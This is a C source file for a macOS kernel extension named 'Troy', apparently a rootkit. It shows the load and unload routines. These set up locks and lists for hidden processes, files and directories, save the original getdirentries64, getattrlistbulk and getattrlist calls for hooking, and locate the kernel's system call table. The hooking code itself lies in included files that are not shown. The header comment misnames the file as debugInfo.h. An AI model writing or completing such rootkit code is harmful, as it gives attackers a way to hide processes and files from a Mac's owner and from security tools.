//
//  debugInfo.h
//  Troy
//
//  Created by Axis on 15/5/6.
//  Copyright (c) 2015年 Axis. All rights reserved.
//

#include <mach/mach_types.h>
#include <libkern/libkern.h>
#include <sys/conf.h>
#include <sys/ioctl.h>
#include <miscfs/devfs/devfs.h>
#include <mach-o/loader.h>
#include <sys/syscall.h>

#include "debugInfo.h"
#include "KernelInfo.h"
#include "configure.h"
#include "HookSystemCall.h"
#include "Control.h"
#include "common.h"
#include "HookCAPI.h"

kern_return_t troy_start(kmod_info_t * ki, void *d);
kern_return_t troy_stop(kmod_info_t *ki, void *d);

struct sysent_own* system_table;

#pragma mark - lock object
lck_grp_t *lck_grp=NULL;
lck_grp_attr_t *lck_grp_attr=NULL;
lck_mtx_t *lck_mtx_hide_process=NULL;
lck_mtx_t *lck_mtx_hide_file=NULL;
lck_mtx_t *lck_mtx_hide_directory=NULL;
lck_mtx_t *lck_mtx_hide_proc_array=NULL;
lck_rw_t *lck_rw_hide_file_dirent_array=NULL;

#pragma mark - original function
getdirentries64_function_prototype my_getdirentries64=NULL; //hide the directory
getattrlistbulk_function_prototype my_getattrlistbulk=NULL;
getattrlist_function_prototype my_getattrlist=NULL;

#pragma mark - TAILQ
struct hide_proc_list hide_proc_array;  //for store process that is hide
struct hide_file_dirent_list hide_file_dirent_array;

kern_return_t troy_start(kmod_info_t * ki, void *d)
{
    LOG(LOG_DEBUG, "start");
    errno_t error_code=KERN_SUCCESS;

    //allocate lock's memory
    error_code=alloc_kext_lock();
    if(error_code!=KERN_SUCCESS) goto failed;

    //init the device file for communicating
    error_code = init_troy_components();
    if(error_code!=KERN_SUCCESS)
    {
        goto failed;
    }

    TAILQ_INIT(&hide_proc_array);   //init process array that the process is hidden
    TAILQ_INIT(&hide_file_dirent_array);

    system_table = GetSystemTable();    //get system table's address

//    mach_vm_address_t addr =  getKernelHeader();
//    if(addr==0)
//    {
//        goto failed;
//    }
//    struct mach_header_64 *header = (struct mach_header_64*)addr;
//    LOG(LOG_DEBUG, "magic=%x", header->magic);
//    LOG(LOG_DEBUG, "cpusubtype=%x", header->cpusubtype);
//    LOG(LOG_DEBUG, "filetype=%x", header->filetype);
    
//    struct sysent_own* table = GetSystemTable();
//    LOG(LOG_DEBUG, "the systam table is %p", table);

    return KERN_SUCCESS;
failed:
    destroy_troy_component();   //free device files
    free_kext_lock();           //free all kernel's lock

    return KERN_FAILURE;
}

kern_return_t troy_stop(kmod_info_t *ki, void *d)
{
    LOG(LOG_DEBUG, "Enter");

    errno_t return_code=KERN_SUCCESS;
    return_code=destroy_troy_component();   //free device files
    if(return_code!=KERN_SUCCESS) return KERN_FAILURE;

    free_kext_lock();           //free all kernel's lock

    LOG(LOG_DEBUG, "Leave");
    return KERN_SUCCESS;
}
